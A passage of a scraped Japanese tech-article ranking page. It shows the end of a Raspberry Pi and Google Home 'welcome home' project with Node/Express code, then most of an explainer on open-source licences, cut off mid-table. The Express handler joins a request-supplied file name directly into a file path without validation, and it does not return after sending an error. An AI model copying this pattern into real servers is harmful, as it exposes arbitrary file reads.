  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">audio</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">'Invalid Parameters.'</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kr">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">__dirname</span> <span class="o">+</span> <span class="s1">'/public/audio/'</span> <span class="o">+</span> <span class="nx">audioName</span><span class="p">,</span> <span class="s1">'binary'</span><span class="p">);</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s1">'Content-Length'</span><span class="p">,</span> <span class="nx">file</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">file</span><span class="p">,</span> <span class="s1">'binary'</span><span class="p">);</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">serverPort</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Start api-server. Port is </span><span class="si">${</span><span class="nx">serverPort</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="p">})</span>
</pre></div>
</div>

<h3>
<span id="raspberrypi上でプログラムを常駐させる" class="fragment"></span><a href="#raspberrypi%E4%B8%8A%E3%81%A7%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%82%92%E5%B8%B8%E9%A7%90%E3%81%95%E3%81%9B%E3%82%8B"><i class="fa fa-link"></i></a>RaspberryPi上でプログラムを常駐させる</h3>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span><span class="c1">// 照度を監視</span>
<span class="nx">forever</span> <span class="nx">start</span> <span class="o">--</span><span class="nx">spinSleepTime</span> <span class="mi">7000</span> <span class="o">-</span><span class="nx">m</span> <span class="mi">1000</span> <span class="nx">google</span><span class="o">-</span><span class="nx">home</span><span class="o">/</span><span class="nx">app</span><span class="o">/</span><span class="nx">index</span><span class="p">.</span><span class="nx">js</span>

<span class="c1">// 音声ファイルを返すAPI</span>
<span class="nx">forever</span> <span class="nx">start</span> <span class="o">--</span><span class="nx">spinSleepTime</span> <span class="mi">7000</span> <span class="o">-</span><span class="nx">m</span> <span class="mi">1000</span> <span class="nx">google</span><span class="o">-</span><span class="nx">home</span><span class="o">/</span><span class="nx">api</span><span class="o">-</span><span class="nx">server</span><span class="o">/</span><span class="nx">index</span><span class="p">.</span><span class="nx">js</span>
</pre></div></div>

<p>全ソースコードは<a href="https://github.com/taaaaaaak22/google-home" rel="nofollow noopener" target="_blank">こちら</a>をご参考ください。</p>

<h1>
<span id="できたもの" class="fragment"></span><a href="#%E3%81%A7%E3%81%8D%E3%81%9F%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>できたもの</h1>

<blockquote class="twitter-tweet">
<p>照度センサー用いて帰宅検知して、GoogleHomeに「おかえりなさい」って言ってもらうようにした。音声はmp3ファイル再生してるだけだから夢が広がりますな。とりあえず帰宅時間帯に応じていろんな「おかえりなさい」をランダム再生してる。<a href="https://twitter.com/hashtag/googlehome?src=hash&amp;ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">#googlehome</a> <a href="https://t.co/G3UrDwcIup" rel="nofollow noopener" target="_blank">pic.twitter.com/G3UrDwcIup</a></p>— のなめ (@dotsline_22) <a href="https://twitter.com/dotsline_22/status/919560500886650880?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">2017年10月15日</a>
</blockquote>



<h1>
<span id="最後に" class="fragment"></span><a href="#%E6%9C%80%E5%BE%8C%E3%81%AB"><i class="fa fa-link"></i></a>最後に</h1>

<p>帰宅後、前より寂しい気持ちになった(´・ω・`)</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">56位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>175</kbd>
		<a target="_blank" href="https://qiita.com/toe/items/c5aa9446e73aa4bc1de0">OSSのライセンスを理解する（「使用」と「利用」の違い、知っていますか？）</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-19<br />18:15:13</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/155486.html">toe</a>(10件の記事)<br><img width="80" height="80" src="https://secure.gravatar.com/avatar/b421ef1d479124a64323e42e3c266366">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[GPL]</b> <b>[MIT-License]</b> <b>[著作権]</b> <b>[OSS]</b> <b>[オープンソース]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>最近、私的にDockerで遊んでいるのですが、Dockerを使っていると様々なライセンスを有したオープンソースソフトウェア（OSS）と遭遇します。自分が知らない間に著作権に抵触してしまうことが怖かったので、OSSのライセンスについて以下の流れでまとめてみました。</p>

<ol>
<li>「ライセンス関連用語」を理解する</li>
<li>「オープンソースの定義」を理解する</li>
<li>「コピーレフト」を理解する</li>
<li>「主要ライセンス」を理解する</li>
</ol>

<p><a></a></p>

<h2>
<span id="1ライセンス関連用語を理解する" class="fragment"></span><a href="#1%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9%E9%96%A2%E9%80%A3%E7%94%A8%E8%AA%9E%E3%82%92%E7%90%86%E8%A7%A3%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>1.「ライセンス関連用語」を理解する</h2>

<p>OSSを理解するにあたって、まずは主要なライセンス関連用語の定義を理解することが重要です。私の場合は、<strong>「使用」と「利用」の違い</strong>や<strong>「オープンソースソフトウェア」と「フリーウェア」の違い</strong>について、恥ずかしながら明確に理解できていませんでした。。。</p>

<h4>
<span id="オープンソースソフトウェアopen-source-software-oss" class="fragment"></span><a href="#%E3%82%AA%E3%83%BC%E3%83%97%E3%83%B3%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%BD%E3%83%95%E3%83%88%E3%82%A6%E3%82%A7%E3%82%A2open-source-software-oss"><i class="fa fa-link"></i></a>【オープンソース・ソフトウェア（Open Source Software, OSS）】</h4>

<ul>
<li>ソースコードが無償で公開されているソフトウェアのこと。</li>
</ul>

<p><a></a></p>

<h4>
<span id="派生ソフトウェアderived-works" class="fragment"></span><a href="#%E6%B4%BE%E7%94%9F%E3%82%BD%E3%83%95%E3%83%88%E3%82%A6%E3%82%A7%E3%82%A2derived-works"><i class="fa fa-link"></i></a>【派生ソフトウェア（derived works）】</h4>

<ul>
<li> あるソフトウェアを<strong>引用または改変</strong>して作成されたソフトウェアのこと。</li>
<li>著作権法における「二次的著作物」を示す。</li>
</ul>

<p><a></a></p>

<h4>
<span id="頒布distribution" class="fragment"></span><a href="#%E9%A0%92%E5%B8%83distribution"><i class="fa fa-link"></i></a>【頒布（distribution）】</h4>

<ul>
<li>ソフトウェアを第三者へ提供すること。</li>
<li>「配布」と同義。</li>
</ul>

<p><a></a></p>

<h4>
<span id="再頒布redistribution" class="fragment"></span><a href="#%E5%86%8D%E9%A0%92%E5%B8%83redistribution"><i class="fa fa-link"></i></a>【再頒布（redistribution)】</h4>

<ul>
<li>誰かが頒布したソフトウェアを入手し、別の場所で頒布すること。</li>
<li>派生ソフトウェアを第三者へ提供すること。</li>
</ul>

<h4>
<span id="使用use" class="fragment"></span><a href="#%E4%BD%BF%E7%94%A8use"><i class="fa fa-link"></i></a>【使用（use）】</h4>

<blockquote>
<p>「使用」とは、著作物を見る，聞く等のような単なる著作物等の享受を指す。<br><br>
（「平成10年2月文化庁著作権審議会マルチメディア小委員会ワーキング・グループ中間まとめ」より）</p>
</blockquote>

<ul>
<li>ソフトウェアを実行したり、ソースコードを閲読・コンパイルすること。</li>
<li>OSSの場合、<strong>ソフトウェアの使用は自由である。</strong>
</li>
</ul>

<p><a></a></p>

<h4>
<span id="利用exploit" class="fragment"></span><a href="#%E5%88%A9%E7%94%A8exploit"><i class="fa fa-link"></i></a>【利用（exploit）】</h4>

<blockquote>
<p>「利用」とは、複製や公衆送信等著作権等の支分権に基づく行為を指す。<br><br>
（「平成10年2月文化庁著作権審議会マルチメディア小委員会ワーキング・グループ中間まとめ」より）</p>
</blockquote>

<ul>
<li>対象のソフトウェアを複写・改変・再頒布すること。</li>
<li>新たに作成したソフトウェアの一部として、対象のソフトウェアを同梱すること。</li>
<li>OSSの場合、<strong>ソフトウェアの利用はオープンソース・ライセンスによって制限されている</strong>。</li>
</ul>

<h4>
<span id="プロプライエタリソフトウェアproprietary-software" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%83%97%E3%83%A9%E3%82%A4%E3%82%A8%E3%82%BF%E3%83%AA%E3%82%BD%E3%83%95%E3%83%88%E3%82%A6%E3%82%A7%E3%82%A2proprietary-software"><i class="fa fa-link"></i></a>【プロプライエタリ・ソフトウェア（proprietary software）】</h4>

<ul>
<li>実行ファイル（バイナリ）として頒布され、ソースコードは公開されないソフトウェアのこと。</li>
<li>商用ソフトウェアやフリーウェア、シェアウェアなどがプロプライエタリ・ソフトウェアに該当する。</li>
<li>プロプライエタリ・ソフトウェアの利用は基本的に禁止されている。</li>
<li><strong>使用許諾書や独自のライセンスで規定された範囲で使用しなければならない。</strong></li>
</ul>

<h4>
<span id="フリーウェアfreeware" class="fragment"></span><a href="#%E3%83%95%E3%83%AA%E3%83%BC%E3%82%A6%E3%82%A7%E3%82%A2freeware"><i class="fa fa-link"></i></a>【フリーウェア（freeware）】</h4>

<ul>
<li>プロプライエタリ・ソフトウェアのうち、無償で提供されるソフトウェアのこと。</li>
</ul>

<table>
<thead>
<tr>
<th>種別</th>
<th>使用</th>
<th>利用</th>
</tr>
</thead>
<tbody>
<tr>
<td>プロプライエタリ・ソフトウェア</td>
<td>使用許諾書や独自のライセンス<br>によって制限</td>
<td>禁止</td>
</tr>
<tr>
<td>オープンソース・ソフトウェア</td>
<td>自由</td>
<td>オープンソース・ライセンス<br>によって制限</td>
</tr>
</tbody>
</table>

<hr>

<h6>
<span id="参考文献" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><i class="fa fa-link"></i></a>参考文献</h6>

<ul>
<li><a href="http://www.weblio.jp/content/%E3%82%AA%E3%83%BC%E3%83%97%E3%83%B3%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%BD%E3%83%95%E3%83%88%E3%82%A6%E3%82%A7%E3%82%A2" rel="nofollow noopener" target="_blank">オープンソースソフトウェアとは - Weblio辞書</a></li>
<li><a href="http://www.weblio.jp/content/%E3%83%97%E3%83%AD%E3%83%97%E3%83%A9%E3%82%A4%E3%82%A8%E3%82%BF%E3%83%AA%E3%82%BD%E3%83%95%E3%83%88%E3%82%A6%E3%82%A7%E3%82%A2" rel="nofollow noopener" target="_blank">プロプライエタリソフトウェアとは - Weblio辞書</a></li>
<li><a href="http://www.weblio.jp/content/%E6%B4%BE%E7%94%9F%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0" rel="nofollow noopener" target="_blank">派生プログラムとは - Weblio辞書</a></li>
<li><a href="https://ja.wikipedia.org/wiki/%E3%83%95%E3%83%AA%E3%83%BC%E3%82%A6%E3%82%A7%E3%82%A2" rel="nofollow noopener" target="_blank">フリーウェア - Wikipedia</a></li>
<li><a href="https://www.catch.jp/openoffice/lisence/softbank_cmag200408.html" rel="nofollow noopener" target="_blank">ソフトの配布とライセンス - 可知豊</a></li>
<li><a href="http://jpn.nec.com/oss/osslc/doc/OSC20090124SendaiBassui.pdf" rel="nofollow noopener" target="_blank">OSSをライセンス的に正しく使う／プロプラだけの製品とするための11のチェックポイント - NEC</a></li>
<li><a href="https://thinkit.co.jp/story/2014/02/24/4843" rel="nofollow noopener" target="_blank">GitHubを利用する際に注意したいOSSライセンスのポイントとは - Think IT</a></li>
<li><a href="https://www.unisys.co.jp/solution/tec/oss/what.html" rel="nofollow noopener" target="_blank">オープンソースとは - 日本ユニシス</a></li>
<li><a href="http://www.cric.or.jp/db/report/h10_2/h10_2_main.html" rel="nofollow noopener" target="_blank">著作権審議会マルチメディア小委員会ワーキング・グループ中間まとめ - 公益社団法人著作権情報センター CRIC</a></li>
<li><a href="http://www.atmarkit.co.jp/ait/articles/0812/08/news122.html" rel="nofollow noopener" target="_blank">企業技術者のためのOSSライセンス入門（1）：訴訟が増えている!? OSSライセンス違反 - ＠IT</a></li>
</ul>

<p><a></a></p>

<h2>
<span id="2オープンソースの定義を理解する" class="fragment"></span><a href="#2%E3%82%AA%E3%83%BC%E3%83%97%E3%83%B3%E3%82%BD%E3%83%BC%E3%82%B9%E3%81%AE%E5%AE%9A%E7%BE%A9%E3%82%92%E7%90%86%E8%A7%A3%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>2.「オープンソースの定義」を理解する</h2>

<p>OSSを規定する上で重要となる「オープンソースの定義」を知っておくと、主要ライセンスを理解する上で大変役立ちます。「オープンソースの定義」とは、Open Source Initiative（OSI）という団体によって策定された十の原則です。オープンソース・ライセンスは基本的にこの定義に従っています。</p>

<p>以下に「オープンソースの定義」の原文（日本語版）を掲載します。ただし原文はやや難解（少なくとも私にとっては）であるため、原文を咀嚼した「<strong>OSSの利用者</strong>」にとっての権利と義務を併せて記載します。</p>

<p><a></a></p>

<h3>
<span id="オープンソースの定義the-open-source-definitionosd" class="fragment"></span><a href="#%E3%82%AA%E3%83%BC%E3%83%97%E3%83%B3%E3%82%BD%E3%83%BC%E3%82%B9%E3%81%AE%E5%AE%9A%E7%BE%A9the-open-source-definitionosd"><i class="fa fa-link"></i></a>オープンソースの定義（The Open Source Definition、OSD）</h3>

<h4>
<span id="1-再頒布はんぷの自由" class="fragment"></span><a href="#1-%E5%86%8D%E9%A0%92%E5%B8%83%E3%81%AF%E3%82%93%E3%81%B7%E3%81%AE%E8%87%AA%E7%94%B1"><i class="fa fa-link"></i></a>1. 再頒布（はんぷ）の自由</h4>

<blockquote>
<p>「オープンソース」であるライセンス(以下「ライセンス」と略)は、出自の様々なプログラムを集めたソフトウェア頒布物(ディストリビューション)の一部として、ソフトウェアを販売あるいは無料で頒布することを制限してはなりません。ライセンスは、このような販売に関して印税その他の報酬を要求してはなりません。</p>
</blockquote>

<ul>
<li>OSSの利用者は派生ソフトウェアを第三者へ無料で提供することも、<strong>有料で販売することもできる</strong>。</li>
<li>派生ソフトウェアを頒布する場合、OSSの利用者はOSSの作成者に対して報酬や印税を支払わなくてよい。</li>
</ul>

<h4>
<span id="2-ソースコード" class="fragment"></span><a href="#2-%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>2. ソースコード</h4>

<blockquote>
<p>「オープンソース」であるプログラムはソースコードを含んでいなければならず、コンパイル済形式と同様にソースコードでの頒布も許可されていなければなりません。何らかの事情でソースコードと共に頒布しない場合には、ソースコードを複製に要するコストとして妥当な額程度の費用で入手できる方法を用意し、それをはっきりと公表しなければなりません。方法として好ましいのはインターネットを通じての無料ダウンロードです。ソースコードは、プログラマがプログラムを変更しやすい形態でなければなりません。意図的にソースコードを分かりにくくすることは許されませんし、プリプロセッサや変換プログラムの出力のような中間形式は認められません。</p>
</blockquote>

<ul>
<li>利用するOSSがコンパイル済みのバイナリファイルであった場合、OSSの利用者はOSSの作成者に対してソースコードを要求することができる。</li>
</ul>

<h4>
<span id="3-派生ソフトウェア" class="fragment"></span><a href="#3-%E6%B4%BE%E7%94%9F%E3%82%BD%E3%83%95%E3%83%88%E3%82%A6%E3%82%A7%E3%82%A2"><i class="fa fa-link"></i></a>3. 派生ソフトウェア</h4>

<blockquote>
<p>ライセンスは、ソフトウェアの変更と派生ソフトウェアの作成、並びに派生ソフトウェアを元のソフトウェアと同じライセンスの下で頒布することを許可しなければなりません。</p>
</blockquote>

<ul>
<li>OSSの利用者は派生ソフトウェアを作成して頒布することができる。</li>
<li>ただし利用するOSSのライセンスによっては、<strong>利用したOSSと同じライセンスを派生ソフトウェアに適用して頒布しなければならない場合がある</strong>。</li>
</ul>

<h4>
<span id="4-作者のソースコードの完全性integrity" class="fragment"></span><a href="#4-%E4%BD%9C%E8%80%85%E3%81%AE%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AE%E5%AE%8C%E5%85%A8%E6%80%A7integrity"><i class="fa fa-link"></i></a>4. 作者のソースコードの完全性(integrity)</h4>

<blockquote>
<p>バイナリ構築の際にプログラムを変更するため、ソースコードと一緒に「パッチファイル」を頒布することを認める場合に限り、ライセンスによって変更されたソースコードの頒布を制限することができます。ライセンスは、変更されたソースコードから構築されたソフトウェアの頒布を明確に許可していなければなりませんが、派生ソフトウェアに元のソフトウェアとは異なる名前やバージョン番号をつけるよう義務付けるのは構いません。</p>
</blockquote>

<ul>
<li>ライセンスによっては、元のOSSのソースコードを改変した状態で再頒布することが禁止されている場合がある。ただしそのような場合は元のOSSのソースコードと併せて「パッチファイル」を頒布することができる。</li>
<li>元のOSSのソースコードを改変した状態で再頒布することが許可されている場合でも、ライセンスによっては、派生ソフトウェアの再頒布時に<strong>元のOSSとは違う名前、違うバージョンをつける</strong>ことが必要な場合がある。</li>
</ul>

<h4>
<span id="5-個人やグループに対する差別の禁止" class="fragment"></span><a href="#5-%E5%80%8B%E4%BA%BA%E3%82%84%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%97%E3%81%AB%E5%AF%BE%E3%81%99%E3%82%8B%E5%B7%AE%E5%88%A5%E3%81%AE%E7%A6%81%E6%AD%A2"><i class="fa fa-link"></i></a>5. 個人やグループに対する差別の禁止</h4>

<blockquote>
<p>ライセンスは特定の個人やグループを差別してはなりません。</p>
</blockquote>

<ul>
<li>OSSは誰でも利用することができる。</li>
</ul>

<h4>
<span id="6-利用する分野fields-of-endeavorに対する差別の禁止" class="fragment"></span><a href="#6-%E5%88%A9%E7%94%A8%E3%81%99%E3%82%8B%E5%88%86%E9%87%8Efields-of-endeavor%E3%81%AB%E5%AF%BE%E3%81%99%E3%82%8B%E5%B7%AE%E5%88%A5%E3%81%AE%E7%A6%81%E6%AD%A2"><i class="fa fa-link"></i></a>6. 利用する分野(fields of endeavor)に対する差別の禁止</h4>

<blockquote>
<p>ライセンスはある特定の分野でプログラムを使うことを制限してはなりません。例えば、プログラムの企業での使用や、遺伝子研究の分野での使用を制限してはなりません。</p>

<p>理由:この条項の主な意図は、ライセンスによってオープンソースが商業的に使われることを妨げるような策略を禁止することです。私たちは、営利的なユーザも私たちのコミュニティに加入してくれることを望んでおり、彼らがそこから排除されているような気分になっては欲しくないのです。</p>
</blockquote>

<ul>
<li>OSSはどの分野で使用してもよく、<strong>商用で使用してもよい</strong>。 </li>
</ul>

<h4>
<span id="7-ライセンスの分配distribution" class="fragment"></span><a href="#7-%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9%E3%81%AE%E5%88%86%E9%85%8Ddistribution"><i class="fa fa-link"></i></a>7. ライセンスの分配(distribution)</h4>

<blockquote>
<p>プログラムに付随する権利はそのプログラムが再頒布された者全てに等しく認められなければならず、彼らが何らかの追加的ライセンスに同意することを必要としてはなりません。</p>
</blockquote>

<ul>
<li>OSSを一切改変せずに再頒布する場合は、そのOSS自体のライセンスを変更したり、ライセンスを追加することはできない。</li>
</ul>

<h4>
<span id="8-特定製品でのみ有効なライセンスの禁止" class="fragment"></span><a href="#8-%E7%89%B9%E5%AE%9A%E8%A3%BD%E5%93%81%E3%81%A7%E3%81%AE%E3%81%BF%E6%9C%89%E5%8A%B9%E3%81%AA%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9%E3%81%AE%E7%A6%81%E6%AD%A2"><i class="fa fa-link"></i></a>8. 特定製品でのみ有効なライセンスの禁止</h4>

<blockquote>
<p>プログラムに付与された権利は、それがある特定のソフトウェア頒布物の一部であるということに依存するものであってはなりません。プログラムをその頒布物から取り出したとしても、そのプログラム自身のライセンスの範囲内で使用あるいは頒布される限り、プログラムが再頒布される全ての人々が、元のソフトウェア頒布物において与えられていた権利と同等の権利を有することを保証しなければなりません。</p>
</blockquote>

<ul>
<li>OSSが派生ソフトウェアの一部として配布された場合でも、OSSだけを取り出して利用することができる。</li>
</ul>

<h4>
<span id="9-他のソフトウェアを制限するライセンスの禁止" class="fragment"></span><a href="#9-%E4%BB%96%E3%81%AE%E3%82%BD%E3%83%95%E3%83%88%E3%82%A6%E3%82%A7%E3%82%A2%E3%82%92%E5%88%B6%E9%99%90%E3%81%99%E3%82%8B%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9%E3%81%AE%E7%A6%81%E6%AD%A2"><i class="fa fa-link"></i></a>9. 他のソフトウェアを制限するライセンスの禁止</h4>

<blockquote>
<p>ライセンスはそのソフトウェアと共に頒布される他のソフトウェアに制限を設けてはなりません。例えば、ライセンスは同じ媒体で頒布される他のプログラムが全てオープンソースソフトウェアであることを要求してはなりません。</p>
</blockquote>

<ul>
<li>派生ソフトウェアとしてOSSを同梱する場合は、どのようなソフトウェアでも一緒に頒布することができる。</li>
</ul>

<h4>
<span id="10-ライセンスは技術中立的でなければならない" class="fragment"></span><a href="#10-%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9%E3%81%AF%E6%8A%80%E8%A1%93%E4%B8%AD%E7%AB%8B%E7%9A%84%E3%81%A7%E3%81%AA%E3%81%91%E3%82%8C%E3%81%B0%E3%81%AA%E3%82%89%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>10. ライセンスは技術中立的でなければならない</h4>

<blockquote>
<p>ライセンス中に、特定の技術やインターフェースの様式に強く依存するような規定があってはなりません。</p>
</blockquote>

<ul>
<li>OSSを利用するときはどのような環境でもライセンスの内容を確認し、同意することができる。</li>
</ul>

<hr>

<h6>
<span id="参考文献-1" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE-1"><i class="fa fa-link"></i></a>参考文献</h6>

<ul>
<li><a href="https://opensource.org/osd.html" rel="nofollow noopener" target="_blank">The Open Source Definition (Annotated) - Open Source Initiative</a></li>
<li>
<a href="http://www.opensource.jp/osd/osd-japanese.html" rel="nofollow noopener" target="_blank">オープンソースの定義(日本語) - The Open Source Initiative</a><br>
</li>
<li><a href="https://ja.wikipedia.org/w/index.php?title=%E3%82%AA%E3%83%BC%E3%83%97%E3%83%B3%E3%82%BD%E3%83%BC%E3%82%B9%E3%81%AE%E5%AE%9A%E7%BE%A9&amp;oldid=57231143" rel="nofollow noopener" target="_blank">オープンソースの定義 - Wikipedia</a></li>
<li>
<a href="https://www.ibm.com/developerworks/jp/opensource/library/itm-oss2/" rel="nofollow noopener" target="_blank">オープンソースで行こう！: 第2回 オープンソースライセンス事情を俯瞰する - IBM</a><br>
</li>
<li>
<a href="http://atsukada.blogspot.jp/2010/04/oss-osithe-open-source-definition-10-10.html?m=1" rel="nofollow noopener" target="_blank">オープンソースの定義を読む - b6note</a><br>
</li>
</ul>

<p><a></a></p>

<h2>
<span id="3コピーレフトを理解する" class="fragment"></span><a href="#3%E3%82%B3%E3%83%94%E3%83%BC%E3%83%AC%E3%83%95%E3%83%88%E3%82%92%E7%90%86%E8%A7%A3%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>3.「コピーレフト」を理解する</h2>

<p>OSSには大きく「コピーレフト型」、「準コピーレフト型」、「⾮コピーレフト型」という3つの種類があり、それぞれの種類に応じて留意すべき点が異なります。以下に「コピーレフト」の概要とその注意点について記載します。</p>

<p><a></a></p>

<h3>
<span id="コピーレフトとは" class="fragment"></span><a href="#%E3%82%B3%E3%83%94%E3%83%BC%E3%83%AC%E3%83%95%E3%83%88%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>「コピーレフト」とは</h3>

<ul>
<li>利⽤者にOSSを複写・改変・再頒布する⾃由を与える⼀⽅で、派⽣ソフトウェアを頒布する際は、<strong>全く同じ条件で</strong>派⽣ソフトウェアを頒布することを義務付けること。</li>
<li>以下の基準によって、大きく3つに分類することができる。<br>
① ソフトウェア利⽤者に対して、利⽤者がソースコードを改変した際に、改変部分のソースの開⽰を義務づけるかどうか<br>
② ソフトウェア利⽤者がソースコードを他のソフトウェアのソースコードと組み合わせた際に、他のソースコードの開⽰を義務づけるかどうか </li>
</ul>

<table>
<thead>
<tr>
<th style="text-align: left">類型</th>
<th style="text-align: center">①改変部分のソースコードの開⽰</th>
<th style="text-align: center">②他のソフトウェアのソースコード開⽰</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">コピーレフト型</td>
<td style="text-align: center">要</td>
<td style="text-align: center">要</td>
</tr>
<tr>
<td style="text-align: left">準コピーレフト型</td>
<td style="text-align: center">要</td>
<td style="text-align: center">不要</td>
</tr>
<tr>
<td style="text-align: left">⾮コピーレフト型</td>
<td style="text-align: center">不要</td>
<td style="text-align: center">不要</td>
</tr>
</tbody>
</table>

<p><a></a></p>

<h3>
<span id="コピーレフト型及び準コピーレフト型ソフトウェアを扱う際の注意点" class="fragment"></span><a href="#%E3%82%B3%E3%83%94%E3%83%BC%E3%83%AC%E3%83%95%E3%83%88%E5%9E%8B%E5%8F%8A%E3%81%B3%E6%BA%96%E3%82%B3%E3%83%94%E3%83%BC%E3%83%AC%E3%83%95%E3%83%88%E5%9E%8B%E3%82%BD%E3%83%95%E3%83%88%E3%82%A6%E3%82%A7%E3%82%A2%E3%82%92%E6%89%B1%E3%81%86%E9%9A%9B%E3%81%AE%E6%B3%A8%E6%84%8F%E7%82%B9"><i class="fa fa-link"></i></a>「コピーレフト型」及び「準コピーレフト型」ソフトウェアを扱う際の注意点</h3>

<ul>
<li>コピーレフト型及び準コピーレフト型ソフトウェアは<strong>第三者に再頒布しない限りソースコード開⽰の義務はない</strong>。そのため、以下のケースではソースコードを開⽰する必要はない。

<ul>
<li>OSSを改造して自分一人で使用している</li>
<li>企業においてOSSを改造し、自社内でのみ使用している</li>
</ul>
</li>
<li>改造したソフトウェアの実行ファイル（バイナリ）を第三者に頒布・販売したケースにおいても、ソースコードを要求できるのは<strong>直接配布・販売を受けた者</strong>に限られている。</li>
<li>ソースコードを開⽰する義務があるのは<strong>ソフトウェア自体の配布先に対してのみ</strong>である。例えばWebサービスの場合、ソフトウェアはサーバーに頒布されるため、Webサービスの利用者へソースコードを開⽰する必要はない。</li>
</ul>

<hr>

<h6>
<span id="参考文献-2" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE-2"><i class="fa fa-link"></i></a>参考文献</h6>

<ul>
<li><a href="https://www.ipa.go.jp/files/000028335.pdf" rel="nofollow noopener" target="_blank">OSSライセンスの⽐較および利⽤動向ならびに係争に関する調査 - 独立行政法人情報処理推進機構</a></li>
<li><a href="https://thinkit.co.jp/story/2014/02/03/4804" rel="nofollow noopener" target="_blank">コピーレフト型と非コピーレフト型OSSライセンスの違いとは？ - Think IT</a></li>
<li><a href="https://cloudear.jp/blog/?p=896" rel="nofollow noopener" target="_blank">コピーレフトライセンスについて考察 - 株式会社クラウディア</a></li>
</ul>

<p><a></a></p>

<h2>
<span id="4主要ライセンスを理解する" class="fragment"></span><a href="#4%E4%B8%BB%E8%A6%81%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9%E3%82%92%E7%90%86%E8%A7%A3%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>4.「主要ライセンス」を理解する</h2>

<p>GPL、BSD、MIT、Apacheなどの主要ライセンスを適用したソフトウェアを利用する機会は多いと思います。これらのライセンスが適用されたOSSを利用し、派生ソフトウェアとして頒布する際の注意事項をライセンス別にまとめました。</p>

<table>
<thead>
<tr>
<th>種類</th>
<th style="text-align: center">利用元のライセンス表示</th>
<th style="text-align: center">類型</th>
<th style="text-align: center">作成者名の無断使用</th>
<th style="text-align: center">特許条項</th>
</tr>
</thead>
<tbody>
<tr>
<td>GNU GPL v2</td>
<td style="text-align: center">必要</td>
<td style="text-align: center"><strong>コピーレフト</strong></td>
<td style="text-align: center">-</td>
<td style="text-align: center">なし</td>
</tr>
<tr>
<td>GNU GPL v3</td>
<td style="text-align: center">必要</td>
<td style="text-align: center"><strong>コピーレフト</strong></td>
<td style="text-align: center">-</td>
<td style="text-align: center"><strong>あり</strong></td>
</tr>
<tr>
<td>MIT License</td>
<td style="text-align: center">必要</td>
<td style="text-align: center">非コピーレフト</td>
<td style="text-align: center">-</td>
<td style="text-align: center">なし</td>
</tr>
<tr>
<td>2-Clause BSD License</td>
<td style="text-align: center">必要</td>
<td style="text-align: center">非コピーレフト</td>
<td style="text-align: center">-</td>
<td style="text-align: center">なし</td>
</tr>
<tr>
<td>3-Clause BSD License</td>
<td style="text-align: center">必要</td>
<td style="text-align: center">非コピーレフト</td>
<td style="text-align: center"><strong>禁止</strong></td>
<td style="text-align: center">なし</td>
</tr>
<tr>
<td>Apache License Version 2.0</td>
<td style="text-align: center">必要</td>
<td style="text-align: center">非コピーレフト</td>
